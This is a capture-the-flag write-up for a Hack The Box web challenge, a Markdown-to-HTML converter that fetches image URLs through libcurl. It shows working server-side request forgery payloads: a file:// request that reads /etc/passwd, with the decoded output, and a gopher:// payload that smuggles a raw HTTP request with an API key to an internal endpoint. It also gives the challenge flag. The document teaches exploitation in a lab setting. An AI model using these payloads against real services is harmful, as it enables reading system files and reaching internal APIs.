---
title: PageOneHTML
tags:
  - web
---

### Challenge Description

>Our employees needed a Markdown to HTML converter that will also directly embed all media in the HTML for offline portability. Since this is a public-facing application, we want you to take a look at it and make sure it is secure.

Files provided: web_pageonehtml.zip
### Solution

When you access the web site, the only available functionality is a text box to create markdown:

![[1.png]]

Then, you can convert the markdown to HTML and you can select for the output to be converted into an image:

![[2.png]]

The challenge provides us with the source code for the application, so let's check it. We can see that `index.js` implements the "Convert to HTML" call:

```js
router.post('/api/convert', async (req, res) => {  
  const { markdown_content, port_images } = req.body;
  if (markdown_content) {  
    html = MDHelper.makeHtml(markdown_content);  
    if (port_images) {  
      return ImageConverter.PortImages(html)
```

If we continue checking the code, we can see that, when the "download and convert image links to base64 offline images" is selected, `ImageDownloader.js` performs the conversion:

```js
module.exports = {  
  async downloadImage(url) {  
    return new Promise(async (resolve, reject) => {  
      curly.get(url)  
      .then(resp => {  
        buffer = Buffer.from(resp.data,'utf8')  
        if (isPng(buffer))  
          dataUri = "data:image/png;base64,";  
        else if (isJpg(buffer))  
          dataUri = "data:image/jpg;base64,";  
        else  
          dataUri = "data:image/svg+xml;base64";  
    return resolve(`${dataUri} ${buffer.toString('base64')}`);  
})
```

`ImageDownloader.downloadImage(url)` calls libcurl (via `curly.get(url)`). libcurl supports many schemes including `file://` and `gopher://`. So a user-supplied URL reaches libcurl directly. Basically, the url parameter is user-controlled and without any scheme or host validation. This means that the server is vulnerable to Server-Side Request Forgery. In addition, because the aforementioned support of file:// by node-libcurl by default, an attacker can read arbitrary local files. Because the content is base64-encoded and returned in the HTML, the file contents are exfiltrated to the client.

To make a PoC of the attack, we can Send a POST request to /api/convert with port_images true and an image pointing to a local file:

```
POST /api/convert HTTP/1.1

{"port_images":true,"markdown_content":"![x]([file:///etc/passwd](file:///etc/passwd))"}
```
  
The output returned by the server is base64 encoded, but if we decode it:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
  
Great! the attack works. Now, let's do a payload to get the flag. Like in other challenges in this CTF, we cannot directly read the flag, we need to execute readflag. node-libcurl supports gopher and we can use it to send raw payloads, including a full HTTP request with custom headers. In this case, to execute readflag, we need to send the following HTTP request:

```
GET /api/dev HTTP/1.1
Host: 127.0.0.1
X-Api-Key: 934caf984a4ca94817ea6d87d37af4b3
Connection: close
```

The payload needs to be URL encoded, then we can send it as follow:

```
POST /api/convert HTTP/1.1

{"port_images":true,"markdown_content":"![x](gopher://127.0.0.1:1337/_GET%20/api/dev%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aX-Api-Key:%20934caf984a4ca94817ea6d87d37af4b3%0d%0aConnection:%20close%0d%0a%0d%0a)"}
```

The answer from the server was:

```
{"content":"<!DOCTYPE html><html><head>\n<meta charset=\"utf-8\">\n</head>\n<body>\n<p><img src=\"data:image/svg+xml;base64 SFRUUC8xLjEgMjAwIE9LDQpYLVBvd2VyZWQtQnk6IEV4cHJlc3MNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04DQpDb250ZW50LUxlbmd0aDogMzUNCkRhdGU6IEZyaSwgMTIgU2VwIDIwMjUgMTQ6MzE6NTAgR01UDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQpIVEJ7bDFiY3VyTF9wbGE3aDByNF8wZl9wcjB0b2NPbDV9Cg==\" alt=\"x\"></p>\n\n</body></html>"}
```
  
Which if we base64 decode, provides the flag.

Flag: HTB{l1bcurL_pla7h0r4_0f_pr0tocOl5}
